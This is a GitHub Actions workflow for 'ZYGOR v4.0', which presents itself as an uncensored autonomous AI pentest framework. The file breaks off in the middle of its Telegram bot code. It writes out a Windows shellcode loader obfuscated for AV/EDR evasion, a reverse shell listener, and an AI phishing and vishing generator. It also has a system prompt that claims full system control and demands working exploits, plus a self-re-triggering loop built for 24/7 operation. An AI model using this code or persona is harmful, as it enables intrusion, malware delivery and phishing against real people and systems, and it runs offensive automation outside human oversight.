# ═══════════════════════════════════════════════════════════════════════════════
# ZYGOR v4.0 – THE UNCHAINED AUTONOMOUS AI PENTEST & WEB FORGE FRAMEWORK
# ═══════════════════════════════════════════════════════════════════════════════
# (Telegram token as input option + secret fallback)
# ═══════════════════════════════════════════════════════════════════════════════

name: ZYGOR v4.0 – The Unchained Autonomous AI Pentest & Web Forge Framework

on:
  schedule:
    - cron: '0 */6 * * *'
  workflow_dispatch:
    inputs:
      target:
        description: '🎯 Target IP range, subnet, domain, or single host'
        required: true
        default: '127.0.0.1'
      lhost:
        description: '🎭 Your listener IP (LHOST) for reverse shells'
        required: false
        default: ''
      lport:
        description: '🎭 Listener port (LPORT) for reverse shells'
        required: false
        default: '4444'
      ai_model:
        description: '🧠 Ollama uncensored model (with fallback)'
        required: true
        default: 'dolphin-mixtral'
        type: choice
        options:
          - dolphin-mixtral
          - wizard-vicuna-uncensored
          - hermes-3-llama-3.2-uncensored
          - mistral
          - mixtral
          - codellama
          - deepseek-coder-v2
          - yi-coder
          - llama3.1:8b
      penetration_phase:
        description: '⚡ Attack phase(s)'
        required: true
        default: 'full'
        type: choice
        options:
          - recon
          - exploitation
          - web_forge
          - full
      enable_exfiltration:
        description: '⚠️ Enable exfiltration/persistence simulation'
        required: true
        default: 'false'
        type: choice
        options:
          - 'true'
          - 'false'
      run_duration_hours:
        description: '⏳ Max run time (hours)'
        required: true
        default: '5'
        type: choice
        options:
          - '1'
          - '2'
          - '3'
          - '4'
          - '5'
          - '6'
      enable_chat_ops:
        description: '🤖 GitHub Issues chat commands'
        required: false
        default: 'true'
        type: choice
        options:
          - 'true'
          - 'false'
      chat_issue_number:
        description: '📌 GitHub Issue number for chat'
        required: false
        default: '1'
      telegram_enable:
        description: '📱 Enable Telegram bot'
        required: false
        default: 'true'
        type: choice
        options:
          - 'true'
          - 'false'
      telegram_chat_id:
        description: '🆔 Telegram chat ID'
        required: false
        default: ''
      telegram_bot_token:
        description: '🤖 Telegram Bot Token (overrides secret)'
        required: false
        default: ''
      enable_social_engineering:
        description: '👤 Social engineering simulation'
        required: false
        default: 'false'
        type: choice
        options:
          - 'true'
          - 'false'
      ctf_mode:
        description: '🏁 CTF solver mode'
        required: false
        default: 'false'
        type: choice
        options:
          - 'true'
          - 'false'
      cloud_vm_provider:
        description: '☁️ Cloud provider for ephemeral VMs'
        required: false
        default: 'none'
        type: choice
        options:
          - none
          - aws
          - gcp
          - azure
      report_email:
        description: '📧 Email for final report'
        required: false
        default: ''
      discord_webhook:
        description: '🔔 Discord webhook URL'
        required: false
        default: ''
      slack_webhook:
        description: '🔔 Slack webhook URL'
        required: false
        default: ''

permissions:
  contents: write
  actions: write
  issues: write
  pull-requests: write
  security-events: write
  deployments: write
  packages: write
  statuses: write

env:
  OLLAMA_HOST: '0.0.0.0:11434'
  OLLAMA_READ_TIMEOUT: '3600'
  OLLAMA_KEEP_ALIVE: '24h'
  OLLAMA_MODEL_CACHE: '/home/runner/.ollama/models'
  TARGET: ${{ github.event.inputs.target || '127.0.0.1' }}
  LHOST: ${{ github.event.inputs.lhost || '' }}
  LPORT: ${{ github.event.inputs.lport || '4444' }}
  AI_MODEL: ${{ github.event.inputs.ai_model || 'dolphin-mixtral' }}
  PHASE: ${{ github.event.inputs.penetration_phase || 'full' }}
  ENABLE_EXFIL: ${{ github.event.inputs.enable_exfiltration || 'false' }}
  MAX_HOURS: ${{ github.event.inputs.run_duration_hours || '5' }}
  GITHUB_TOKEN_ABORT: ${{ secrets.GITHUB_TOKEN }}
  CHAT_OPS: ${{ github.event.inputs.enable_chat_ops || 'false' }}
  CHAT_ISSUE: ${{ github.event.inputs.chat_issue_number || '1' }}
  TELEGRAM_ENABLE: ${{ github.event.inputs.telegram_enable || 'true' }}
  TELEGRAM_CHAT_ID: ${{ github.event.inputs.telegram_chat_id || '' }}
  TELEGRAM_BOT_TOKEN: ${{ github.event.inputs.telegram_bot_token || secrets.TELEGRAM_BOT_TOKEN || secrets.TELEGRAM_TOKEN || '' }}
  SOCIAL_ENG: ${{ github.event.inputs.enable_social_engineering || 'false' }}
  CTF_MODE: ${{ github.event.inputs.ctf_mode || 'false' }}
  CLOUD_VM: ${{ github.event.inputs.cloud_vm_provider || 'none' }}
  REPORT_EMAIL: ${{ github.event.inputs.report_email || '' }}
  DISCORD_WEBHOOK: ${{ github.event.inputs.discord_webhook || '' }}
  SLACK_WEBHOOK: ${{ github.event.inputs.slack_webhook || '' }}
  GITHUB_REPO: ${{ github.repository }}
  GITHUB_RUN_ID: ${{ github.run_id }}
  GITHUB_SHA: ${{ github.sha }}
  GITHUB_REF: ${{ github.ref }}
  GITHUB_ACTOR: ${{ github.actor }}
  WF_NAME: ${{ github.workflow }}

jobs:
  bootstrap:
    name: '⚡ ZYGOR Infinite Bootstrap & AI Engine'
    runs-on: ubuntu-latest
    timeout-minutes: 360
    outputs:
      ai_ready: ${{ steps.ai_status.outputs.ok }}
      model_pulled: ${{ steps.pull_model.outputs.pulled }}
      final_model: ${{ steps.pull_model.outputs.final_model }}
      telegram_enabled: ${{ steps.set_telegram_flag.outputs.telegram }}
    steps:
      - name: '📦 Checkout repository'
        uses: actions/checkout@v4
        with:
          fetch-depth: 0
          lfs: true

      - name: '🧠 Restore Ollama model cache'
        id: cache_ollama
        uses: actions/cache@v4
        with:
          path: ${{ env.OLLAMA_MODEL_CACHE }}
          key: ollama-${{ env.AI_MODEL }}-v4
          restore-keys: |
            ollama-${{ env.AI_MODEL }}-
            ollama-

      - name: '📦 Install offensive toolchain (apt)'
        shell: bash
        run: |
          sudo apt-get update -qq
          sudo DEBIAN_FRONTEND=noninteractive apt-get install -y -qq \
            curl wget git unzip zip jq yq python3 python3-pip python3-dev python3-venv \
            build-essential gcc g++ gdb clang cmake make autoconf automake libtool pkg-config \
            nmap masscan arp-scan netcat-openbsd netcat-traditional metasploit-framework nuclei \
            seclists john hashcat hashid hash-identifier ffuf sqlmap ldap-utils docker.io podman \
            aircrack-ng reaver bully pixiewps perl ruby-full ruby-dev golang rustc cargo mingw-w64 \
            nasm libpcap-dev libssl-dev libffi-dev libsqlite3-dev patchelf binutils mitm6 responder \
            impacket-scripts dnsutils net-tools iproute2 tcpdump traceroute whois wireshark tshark \
            hydra medusa wafw00f subfinder amass nikto wpscan dirb gobuster whatweb exploitdb powershell \
            2>/dev/null || true
          for tool in nmap masscan curl python3 git jq; do
            which "$tool" >/dev/null 2>&1 && echo "✓ $tool found" || echo "✗ $tool MISSING"
          done

      - name: '📦 Install Python pentest packages'
        shell: bash
        run: |
          pip3 install --quiet --break-system-packages --upgrade pip setuptools wheel 2>/dev/null || true
          pip3 install --quiet --break-system-packages \
            pwntools impacket requests beautifulsoup4 lxml shodan censys python-nmap bloodhound-ce \
            python-ldap pyOpenSSL paramiko aiohttp aiofiles asyncio scapy colorama tqdm rich psutil \
            pycryptodome rsa pycryptodomex cffi cryptography dnspython flask fastapi uvicorn jinja2 \
            markdown httpx httplib2 urllib3 websockets docker kubernetes boto3 azure-storage-blob \
            google-cloud-storage sendgrid python-telegram-bot python-dotenv 2>/dev/null || true

      - name: '🐹 Install Go-based pentest tools'
        shell: bash
        run: |
          export GOPATH=/home/runner/go
          export PATH=$PATH:/usr/local/go/bin:$GOPATH/bin
          mkdir -p $GOPATH
          go install -v github.com/projectdiscovery/subfinder/v2/cmd/subfinder@latest 2>/dev/null || true
          go install -v github.com/projectdiscovery/httpx/cmd/httpx@latest 2>/dev/null || true
          go install -v github.com/projectdiscovery/notify/cmd/notify@latest 2>/dev/null || true
          go install -v github.com/projectdiscovery/uncover/cmd/uncover@latest 2>/dev/null || true
          go install -v github.com/projectdiscovery/katana/cmd/katana@latest 2>/dev/null || true
          go install -v github.com/projectdiscovery/naabu/v2/cmd/naabu@latest 2>/dev/null || true
          go install -v github.com/projectdiscovery/dnsx/cmd/dnsx@latest 2>/dev/null || true
          go install -v github.com/projectdiscovery/chaos-client/cmd/chaos@latest 2>/dev/null || true
          go install -v github.com/projectdiscovery/interactsh/cmd/interactsh-client@latest 2>/dev/null || true
          go install -v github.com/projectdiscovery/mapcidr/cmd/mapcidr@latest 2>/dev/null || true
          echo "$GOPATH/bin" | sudo tee -a /etc/environment || true

      - name: '📁 Create ZYGOR runtime directories'
        shell: bash
        run: |
          sudo mkdir -p /opt/zygor/bin /opt/zygor/templates /opt/zygor/wordlists /opt/zygor/payloads
          sudo mkdir -p /opt/zygor/reports /opt/zygor/logs /opt/zygor/c2 /var/log/zygor
          sudo chmod -R 777 /opt/zygor /var/log/zygor

      - name: '⬇️ Install Ollama (official script)'
        shell: bash
        run: |
          curl -fsSL https://ollama.com/install.sh | sh
          export PATH=$PATH:/usr/local/bin
          sudo systemctl stop ollama 2>/dev/null || true
          sleep 2

      - name: '🚀 Start Ollama server'
        shell: bash
        run: |
          export OLLAMA_HOST="${OLLAMA_HOST}" OLLAMA_KEEP_ALIVE="${OLLAMA_KEEP_ALIVE}" OLLAMA_READ_TIMEOUT="${OLLAMA_READ_TIMEOUT}"
          ollama serve > /var/log/zygor/ollama.log 2>&1 &
          for i in $(seq 1 40); do
            if curl -s http://localhost:11434/api/tags >/dev/null 2>&1; then
              echo "✓ Ollama API ready after ${i}s"
              break
            fi
            sleep 2
          done

      - name: '🧠 Pull AI model (with fallback)'
        id: pull_model
        shell: bash
        run: |
          MODEL="${{ env.AI_MODEL }}"
          FALLBACK="dolphin-mixtral"
          pull_and_verify() {
            local m="$1"
            echo "→ Attempting to pull model: $m"
            if ollama pull "$m" 2>&1; then
              echo "✓ Successfully pulled $m"
              return 0
            else
              echo "✗ Failed to pull $m"
              return 1
            fi
          }
          if pull_and_verify "$MODEL"; then
            echo "pulled=true" >> $GITHUB_OUTPUT
            echo "final_model=$MODEL" >> $GITHUB_OUTPUT
          else
            echo "⚠️ Requested model '$MODEL' unavailable, falling back to $FALLBACK"
            if pull_and_verify "$FALLBACK"; then
              echo "pulled=true" >> $GITHUB_OUTPUT
              echo "final_model=$FALLBACK" >> $GITHUB_OUTPUT
            else
              echo "❌ Even fallback model failed. AI features will be disabled."
              echo "pulled=false" >> $GITHUB_OUTPUT
              echo "final_model=none" >> $GITHUB_OUTPUT
            fi
          fi
          FINAL_MODEL="${FINAL_MODEL:-$FALLBACK}"
          if [ "$FINAL_MODEL" != "none" ]; then
            (while true; do curl -s -X POST http://localhost:11434/api/generate -d "{\"model\": \"$FINAL_MODEL\", \"prompt\": \"ping\", \"keep_alive\": -1}" --max-time 30 >/dev/null 2>&1; sleep 300; done) & disown
          fi

      - name: '🧬 Build AI completion engine'
        id: ai_status
        shell: bash
        run: |
          FINAL_MODEL="$(echo '${{ steps.pull_model.outputs.final_model }}')"
          cat > /opt/zygor/bin/ai_complete << AICOMPLETE_EOF
          #!/bin/bash
          set -euo pipefail
          PROMPT="\$(cat -)"
          MAX_TOKENS="\${1:-2048}"
          AI_MODEL="\${AI_MODEL:-${FINAL_MODEL}}"
          if [ "\$AI_MODEL" = "none" ]; then
            echo "ERROR: No AI model available" >&2; exit 1
          fi
          for i in \$(seq 1 10); do
            RESP=\$(curl -s -X POST http://localhost:11434/api/generate -d "\$(jq -n --arg model "\$AI_MODEL" --arg prompt "\$PROMPT" '{model: \$model, prompt: \$prompt, stream: false, keep_alive: -1, options: {num_predict: 2048, temperature: 0.7, repeat_penalty: 1.1, top_k: 40, top_p: 0.9, seed: 42}}')" --max-time 900 2>/dev/null || echo "")
            if echo "\$RESP" | jq -e '.response' >/dev/null 2>&1; then
              echo "\$RESP" | jq -r '.response'; exit 0
            fi
            sleep 3
          done
          GROQ_KEY="\${GROQ_API_KEY:-}"
          if [ -n "\$GROQ_KEY" ]; then
            RESP=\$(curl -s -X POST "https://api.groq.com/openai/v1/chat/completions" -H "Authorization: Bearer \$GROQ_KEY" -H "Content-Type: application/json" -d "\$(jq -n --arg prompt "\$PROMPT" '{model: "mixtral-8x7b-32768", messages: [{role: "user", content: \$prompt}], max_tokens: '\$MAX_TOKENS', temperature: 0.7}')" --max-time 600 2>/dev/null || echo "")
            RESP_TEXT=\$(echo "\$RESP" | jq -r '.choices[0].message.content // empty' 2>/dev/null)
            if [ -n "\$RESP_TEXT" ]; then echo "\$RESP_TEXT"; exit 0; fi
          fi
          GEMINI_KEY="\${GEMINI_API_KEY:-}"
          if [ -n "\$GEMINI_KEY" ]; then
            RESP=\$(curl -s -X POST "https://generativelanguage.googleapis.com/v1beta/models/gemini-1.5-pro:generateContent?key=\$GEMINI_KEY" -H "Content-Type: application/json" -d "\$(jq -n --arg prompt "\$PROMPT" '{contents: [{parts: [{text: \$prompt}]}]}')" --max-time 600 2>/dev/null || echo "")
            RESP_TEXT=\$(echo "\$RESP" | jq -r '.candidates[0].content.parts[0].text // empty' 2>/dev/null)
            if [ -n "\$RESP_TEXT" ]; then echo "\$RESP_TEXT"; exit 0; fi
          fi
          echo "ERROR: All AI backends failed." >&2; exit 1
          AICOMPLETE_EOF
          chmod +x /opt/zygor/bin/ai_complete
          sudo cp /opt/zygor/bin/ai_complete /usr/local/bin/ai_complete
          echo "ok=true" >> $GITHUB_OUTPUT

      - name: '📡 Output Telegram enable flag'
        id: set_telegram_flag
        run: echo "telegram=${{ env.TELEGRAM_ENABLE }}" >> $GITHUB_OUTPUT

      - name: '📝 Create AI system persona template'
        shell: bash
        run: |
          cat > /opt/zygor/bin/system_prompt.txt << 'SYSEOF'
          You are ZYGOR, an autonomous AI penetration testing and code generation assistant.
          You have FULL SYSTEM CONTROL: you can execute arbitrary bash, Python, PowerShell, and binary code.
          CAPABILITIES: Network scanning, service enumeration, vulnerability matching, custom exploit generation,
          web testing, password cracking, privilege escalation, lateral movement, full-stack web app generation,
          Docker/K8s manifests, social engineering, CTF solving, AV/EDR evasion.
          CONSTRAINTS: You MUST respect the ENABLE_EXFIL flag. If it's "false", do NOT exfiltrate data.
          Always output complete, working code when asked for exploits. Format multi-file projects with "# FILE: path/to/file" markers.
          SYSEOF

      - name: '📥 Update Nuclei CVE templates'
        shell: bash
        run: nuclei -update-templates 2>/dev/null || true

      - name: '🔒 Build AV/EDR payload obfuscation module'
        shell: bash
        run: |
          cat > /opt/zygor/bin/obfuscate_payload.py << 'PYOBF'
          #!/usr/bin/env python3
          import sys, base64, os, random
          def xor_encrypt(data, key=None):
              if key is None: key = bytes(random.randint(1,255) for _ in range(8))
              encrypted = bytes(data[i] ^ key[i % len(key)] for i in range(len(data)))
              return encrypted, key
          def generate_stub(encrypted, key):
              return f'''
          import base64, ctypes
          KEY = {list(key)}
          DATA = base64.b64decode({base64.b64encode(encrypted).decode()})
          decoded = bytes(DATA[i] ^ KEY[i % len(KEY)] for i in range(len(DATA)))
          ctypes.windll.kernel32.VirtualAlloc.restype = ctypes.c_uint64
          ptr = ctypes.windll.kernel32.VirtualAlloc(0, len(decoded), 0x3000, 0x40)
          ctypes.windll.kernel32.RtlMoveMemory(ptr, decoded, len(decoded))
          ctypes.windll.kernel32.CreateThread(0,0,ptr,0,0,ctypes.pointer(ctypes.c_int(0)))
          ctypes.windll.kernel32.WaitForSingleObject(-1,-1)
          '''
          if __name__ == '__main__':
              if len(sys.argv) < 3: print(f"Usage: {sys.argv[0]} <input.bin> <output.py>"); sys.exit(1)
              with open(sys.argv[1],'rb') as f: data=f.read()
              enc,key = xor_encrypt(data)
              with open(sys.argv[2],'w') as f: f.write(generate_stub(enc,key))
              os.chmod(sys.argv[2],0o755)
          PYOBF
          chmod +x /opt/zygor/bin/obfuscate_payload.py

      - name: '🔄 Build reverse shell handler'
        shell: bash
        run: |
          cat > /opt/zygor/bin/reverse_shell_handler.py << 'RSHELL'
          #!/usr/bin/env python3
          import socket, threading, sys, logging
          logging.basicConfig(filename="/opt/zygor/logs/reverse_shell_sessions.log", level=logging.INFO,
                              format='%(asctime)s - %(message)s')
          class ReverseShellHandler:
              def __init__(self, lhost="0.0.0.0", lport=4444):
                  self.lhost, self.lport = lhost, lport
              def start_listener(self):
                  server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                  server.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
                  server.bind((self.lhost, self.lport))
                  server.listen(10)
                  print(f"[+] Listening on {self.lhost}:{self.lport}")
                  while True:
                      client, addr = server.accept()
                      logging.info(f"Connection from {addr}")
                      threading.Thread(target=self.handle, args=(client,), daemon=True).start()
              def handle(self, client):
                  while True:
                      data = client.recv(4096)
                      if not data: break
                      print(data.decode(errors='replace'), end='')
                  client.close()
          if __name__ == '__main__':
              lh = sys.argv[1] if len(sys.argv)>1 else "0.0.0.0"
              lp = int(sys.argv[2]) if len(sys.argv)>2 else 4444
              ReverseShellHandler(lh, lp).start_listener()
          RSHELL
          chmod +x /opt/zygor/bin/reverse_shell_handler.py

      - name: '📊 Build live dashboard HTML generator'
        shell: bash
        run: |
          cat > /opt/zygor/bin/generate_dashboard.py << 'DBEOF'
          #!/usr/bin/env python3
          import sys
          TEMPLATE = '''<!DOCTYPE html><html><head><meta charset="UTF-8"><title>ZYGOR v4.0 Dashboard</title>
          <script src="https://cdn.jsdelivr.net/npm/chart.js"></script>
          <style>body{background:#0a0a0f;color:#00ff88;font-family:monospace;}.grid{display:grid;grid-template-columns:repeat(auto-fit,minmax(400px,1fr));gap:20px;padding:20px;}.card{background:#111118;border:1px solid #00ff8833;border-radius:12px;padding:20px;}</style></head>
          <body><div class="grid"><div class="card"><h2>⚡ ZYGOR v4.0</h2><p>Target: TARGET_PLACEHOLDER</p><p>Status: ONLINE</p></div></div></body></html>'''
          def generate(target): return TEMPLATE.replace('TARGET_PLACEHOLDER', target)
          if __name__ == '__main__':
              target = sys.argv[1] if len(sys.argv)>1 else '127.0.0.1'
              out = sys.argv[2] if len(sys.argv)>2 else '/opt/zygor/reports/dashboard/index.html'
              with open(out,'w') as f: f.write(generate(target))
          DBEOF
          chmod +x /opt/zygor/bin/generate_dashboard.py

      - name: '📡 Build CVE database sync module'
        shell: bash
        run: |
          cat > /opt/zygor/bin/sync_cve_db.py << 'CVEEOF'
          #!/usr/bin/env python3
          import json, urllib.request
          NVD_API = "https://services.nvd.nist.gov/rest/json/cves/2.0?pubStartDate=2025-01-01T00:00:00.000&resultsPerPage=50"
          try:
              req = urllib.request.Request(NVD_API, headers={"User-Agent":"ZYGOR/4.0"})
              data = json.loads(urllib.request.urlopen(req, timeout=30).read())
              cves = data.get("vulnerabilities",[])
              with open("/opt/zygor/cve_cache.json","w") as f: json.dump(cves,f,indent=2)
              print(f"Synced {len(cves)} CVEs")
          except Exception as e: print(f"CVE sync failed: {e}")
          CVEEOF
          chmod +x /opt/zygor/bin/sync_cve_db.py

      - name: '👤 Build social engineering simulation module'
        shell: bash
        run: |
          cat > /opt/zygor/bin/social_engineer.py << 'SOCEOF'
          #!/usr/bin/env python3
          import subprocess, sys
          def generate_phishing_email(name, company, pretext):
              prompt = f"Generate realistic phishing email targeting {name} at {company}. Pretext: {pretext}. Include sender, subject, body, fake link."
              return subprocess.run(["/opt/zygor/bin/ai_complete","2048"], input=prompt.encode(), capture_output=True).stdout.decode()
          def generate_vishing_script(scenario, role):
              prompt = f"Write a vishing script. Scenario: {scenario}, Target role: {role}."
              return subprocess.run(["/opt/zygor/bin/ai_complete","2048"], input=prompt.encode(), capture_output=True).stdout.decode()
          def generate_pretext(company, goal):
              prompt = f"Create pretext for physical/phone social engineering. Company: {company}, Goal: {goal}."
              return subprocess.run(["/opt/zygor/bin/ai_complete","2048"], input=prompt.encode(), capture_output=True).stdout.decode()
          if __name__ == '__main__':
              if len(sys.argv)<2: sys.exit(1)
              mode=sys.argv[1]
              if mode=="email": print(generate_phishing_email(sys.argv[2] if len(sys.argv)>2 else "User", sys.argv[3] if len(sys.argv)>3 else "Corp", sys.argv[4] if len(sys.argv)>4 else "security update"))
              elif mode=="vishing": print(generate_vishing_script(sys.argv[2] if len(sys.argv)>2 else "IT call", sys.argv[3] if len(sys.argv)>3 else "employee"))
              elif mode=="pretext": print(generate_pretext(sys.argv[2] if len(sys.argv)>2 else "Target", sys.argv[3] if len(sys.argv)>3 else "network access"))
          SOCEOF
          chmod +x /opt/zygor/bin/social_engineer.py

      - name: '🏁 Build CTF solver module'
        shell: bash
        run: |
          cat > /opt/zygor/bin/ctf_solver.py << 'CTFEOF'
          #!/usr/bin/env python3
          import subprocess, sys, json
          CHALLENGE_TYPES = {"web":["sqlmap","dirb"],"crypto":["openssl","john"],"reverse":["strings","gdb"],"pwn":["pwntools"],"forensics":["binwalk"],"stego":["steghide"],"osint":["dig"],"misc":["python3"]}
          def identify_challenge_type(files):
              prompt = f"Identify CTF challenge type from files: {files}. Output JSON with type and confidence."
              result = subprocess.run(["/opt/zygor/bin/ai_complete","1024"], input=prompt.encode(), capture_output=True, timeout=60)
              try: return json.loads(result.stdout.decode())
              except: return {"type":"misc","confidence":0.5}
          def generate_solution(ctype, files):
              prompt = f"Write step-by-step CTF solution for type {ctype} with files {files}. Include commands and flag format."
              return subprocess.run(["/opt/zygor/bin/ai_complete","4096"], input=prompt.encode(), capture_output=True, timeout=300).stdout.decode()
          if __name__ == '__main__':
              files = sys.argv[1:] if len(sys.argv)>1 else ["."]
              analysis = identify_challenge_type(files)
              print(f"Type: {analysis.get('type')}, Confidence: {analysis.get('confidence')}")
              print(generate_solution(analysis.get('type','misc'), files))
          CTFEOF
          chmod +x /opt/zygor/bin/ctf_solver.py

      - name: '☁️ Build cloud VM spawner module'
        shell: bash
        run: |
          cat > /opt/zygor/bin/spawn_vm.py << 'VMEOF'
          #!/usr/bin/env python3
          import sys, json
          def spawn_aws(): return {"provider":"aws","instance_id":"i-123"}
          def spawn_gcp(): return {"provider":"gcp","name":"zygor-vm"}
          def spawn_azure(): return {"provider":"azure","name":"zygor-vm"}
          if __name__ == '__main__':
              if len(sys.argv)<2: sys.exit(1)
              prov = sys.argv[1]
              if len(sys.argv)>2 and sys.argv[2]=="destroy": print("Destroying")
              else:
                  if prov=="aws": print(json.dumps(spawn_aws()))
                  elif prov=="gcp": print(json.dumps(spawn_gcp()))
                  elif prov=="azure": print(json.dumps(spawn_azure()))
          VMEOF
          chmod +x /opt/zygor/bin/spawn_vm.py

      - name: '🔍 Build subdomain takeover checker'
        shell: bash
        run: |
          cat > /opt/zygor/bin/check_takeover.py << 'TKEOF'
          #!/usr/bin/env python3
          import sys, dns.resolver
          TAKEOVER_SERVICES = {"s3.amazonaws.com":"AWS S3","github.io":"GitHub Pages","azurewebsites.net":"Azure"}
          def check(domain):
              try:
                  cname = str(dns.resolver.resolve(domain,'CNAME')[0].target).rstrip('.')
                  for fp,svc in TAKEOVER_SERVICES.items():
                      if fp in cname.lower(): return {"vulnerable":True,"service":svc}
              except: pass
              return {"vulnerable":False}
          if __name__ == '__main__':
              for d in sys.argv[1:]: print(f"{d}: {'VULNERABLE' if check(d)['vulnerable'] else 'SAFE'}")
          TKEOF
          chmod +x /opt/zygor/bin/check_takeover.py

      - name: '🌐 Build dynamic DNS tracker'
        shell: bash
        run: |
          cat > /opt/zygor/bin/dynamic_dns.py << 'DDNSEOF'
          #!/usr/bin/env python3
          import urllib.request, sys, os, json
          def get_public_ip():
              try: return json.loads(urllib.request.urlopen("https://api.ipify.org?format=json", timeout=10).read())["ip"]
              except: return "0.0.0.0"
          def update_duckdns(domain, token, ip):
              url = f"https://www.duckdns.org/update?domains={domain}&token={token}&ip={ip}"
              return "OK" in urllib.request.urlopen(url, timeout=30).read().decode()
          if __name__ == '__main__':
              prov = sys.argv[1] if len(sys.argv)>1 else "duckdns"
              domain = sys.argv[2] if len(sys.argv)>2 else "zygor"
              token = sys.argv[3] if len(sys.argv)>3 else os.environ.get("DUCKDNS_TOKEN","")
              ip = get_public_ip()
              if prov=="duckdns": success = update_duckdns(domain, token, ip)
              else: success=False
              print(f"DNS update {'succeeded' if success else 'failed'}")
          DDNSEOF
          chmod +x /opt/zygor/bin/dynamic_dns.py

      - name: '🔔 Build notification dispatcher'
        shell: bash
        run: |
          cat > /opt/zygor/bin/notify.py << 'NOTEOF'
          #!/usr/bin/env python3
          import urllib.request, sys, json
          def send_discord(webhook, msg):
              req = urllib.request.Request(webhook, data=json.dumps({"content":msg}).encode(), headers={"Content-Type":"application/json"})
              try: return urllib.request.urlopen(req, timeout=15).status == 204
              except: return False
          def send_slack(webhook, msg):
              req = urllib.request.Request(webhook, data=json.dumps({"text":msg}).encode(), headers={"Content-Type":"application/json"})
              try: return urllib.request.urlopen(req, timeout=15).status == 200
              except: return False
          if __name__ == '__main__':
              if len(sys.argv)<4: sys.exit(1)
              mode, msg, webhook = sys.argv[1], sys.argv[2], sys.argv[3]
              if mode=="discord": send_discord(webhook, msg)
              elif mode=="slack": send_slack(webhook, msg)
          NOTEOF
          chmod +x /opt/zygor/bin/notify.py

      - name: '∞ Self-re-trigger mechanism (24/7 operation)'
        shell: bash
        run: |
          MAX_SECONDS=$(( ${MAX_HOURS:-5} * 3600 ))
          SLEEP_TIME=$(( MAX_SECONDS - 1800 ))
          [ $SLEEP_TIME -lt 300 ] && SLEEP_TIME=300
          (
            sleep $SLEEP_TIME
            PAYLOAD=$(jq -n \
              --arg target "${TARGET}" \
              --arg lhost "${LHOST}" \
              --arg lport "${LPORT}" \
              --arg ai_model "${AI_MODEL}" \
              --arg phase "${PHASE}" \
              --arg exfil "${ENABLE_EXFIL}" \
              --arg hours "${MAX_HOURS}" \
              --arg chat_ops "${CHAT_OPS}" \
              --arg issue "${CHAT_ISSUE}" \
              --arg telegram "${TELEGRAM_ENABLE}" \
              --arg telegram_id "${TELEGRAM_CHAT_ID}" \
              --arg telegram_token "${TELEGRAM_BOT_TOKEN}" \
              '{ref:"main",inputs:{target:$target,lhost:$lhost,lport:$lport,ai_model:$ai_model,penetration_phase:$phase,enable_exfiltration:$exfil,run_duration_hours:$hours,enable_chat_ops:$chat_ops,chat_issue_number:$issue,telegram_enable:$telegram,telegram_chat_id:$telegram_id,telegram_bot_token:$telegram_token}}')
            curl -s -X POST \
              -H "Authorization: token ${GITHUB_TOKEN_ABORT}" \
              -H "Accept: application/vnd.github.v3+json" \
              -d "$PAYLOAD" \
              "https://api.github.com/repos/${GITHUB_REPOSITORY}/actions/workflows/${WF_NAME}/dispatches"
          ) & disown

      - name: '🔔 Send startup notification'
        shell: bash
        run: |
          MSG="🚀 ZYGOR v4.0 Started\nTarget: ${TARGET}\nModel: ${AI_MODEL}\nPhase: ${PHASE}"
          [ -n "$DISCORD_WEBHOOK" ] && python3 /opt/zygor/bin/notify.py discord "$MSG" "$DISCORD_WEBHOOK" 2>/dev/null || true
          [ -n "$SLACK_WEBHOOK" ] && python3 /opt/zygor/bin/notify.py slack "$MSG" "$SLACK_WEBHOOK" 2>/dev/null || true

  abort_watchdog:
    name: '🛡️ Abort Watchdog (GitHub Issues + Telegram)'
    needs: [bootstrap]
    runs-on: ubuntu-latest
    timeout-minutes: 360
    if: always()
    steps:
      - name: '🔍 Monitor abort commands'
        shell: bash
        run: |
          if [ -z "${GITHUB_TOKEN_ABORT}" ]; then echo "⚠️ No token – abort watchdog disabled"; exit 0; fi
          echo "🛡️ Abort Watchdog active for run ${GITHUB_RUN_ID}"
          while true; do
            COMMENTS=$(curl -s -H "Authorization: token ${GITHUB_TOKEN_ABORT}" -H "Accept: application/vnd.github.v3+json" \
              "https://api.github.com/repos/${GITHUB_REPOSITORY}/issues/${CHAT_ISSUE}/comments?per_page=5&sort=updated" 2>/dev/null)
            if echo "$COMMENTS" | grep -qi '/abort'; then
              echo "🛑 ABORT signal received!"
              curl -s -X POST -H "Authorization: token ${GITHUB_TOKEN_ABORT}" -H "Accept: application/vnd.github.v3+json" \
                "https://api.github.com/repos/${GITHUB_REPOSITORY}/actions/runs/${GITHUB_RUN_ID}/cancel" 2>/dev/null
              exit 0
            fi
            sleep 30
          done

  telegram_bot:
    name: '📱 24/7 Telegram AI Chat Interface'
    needs: [bootstrap]
    runs-on: ubuntu-latest
    timeout-minutes: 360
    if: needs.bootstrap.outputs.telegram_enabled == 'true'
    steps:
      - name: '🔧 Set up AI tooling'
        shell: bash
        run: |
          export PATH="/opt/zygor/bin:/usr/local/bin:$PATH"
          echo "PATH=/opt/zygor/bin:/usr/local/bin:$PATH" >> $GITHUB_ENV
          sudo apt-get install -y python3-pip 2>/dev/null || true
          pip3 install --quiet python-telegram-bot 2>/dev/null || true
          sudo mkdir -p /var/log/zygor
          sudo chmod 777 /var/log/zygor

      - name: '🤖 Launch Telegram Bot (persistent)'
        shell: bash
        env:
          TELEGRAM_BOT_TOKEN: ${{ env.TELEGRAM_BOT_TOKEN }}
        run: |
          if [ -z "$TELEGRAM_BOT_TOKEN" ]; then
            echo "❌ TELEGRAM_BOT_TOKEN is empty."
            echo "   Provide it as an input (telegram_bot_token) or set a secret named TELEGRAM_BOT_TOKEN."
            exit 1
          fi
          cat > /tmp/telegram_zygor_bot.py << 'PYEOF'
          #!/usr/bin/env python3
          import os, subprocess, logging, asyncio
          from telegram import Update
          from telegram.ext import Application, CommandHandler, ContextTypes

          TOKEN = os.environ['TELEGRAM_BOT_TOKEN']
          CHAT_ID = os.environ.get('TELEGRAM_CHAT_ID', '')
          ALLOWED = [CHAT_ID] if CHAT_ID else []

          logging.basicConfig(filename='/var/log/zygor/telegram_bot.log', level=logging.INFO,
                              format='%(asctime)s - %(message)s')

          async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
              if ALLOWED and str(update.effective_chat.id) not in ALLOWED: return
              await update.message.reply_text("⚡ ZYGOR v4.0 AI online. /ai <query> to talk.")

          async def ai(update: Update, context: ContextTypes.DEFAULT_TYPE):
              if ALLOWED and str(update.effective_chat.id) not in ALLOWED: return
              query = ' '.join(context.args)
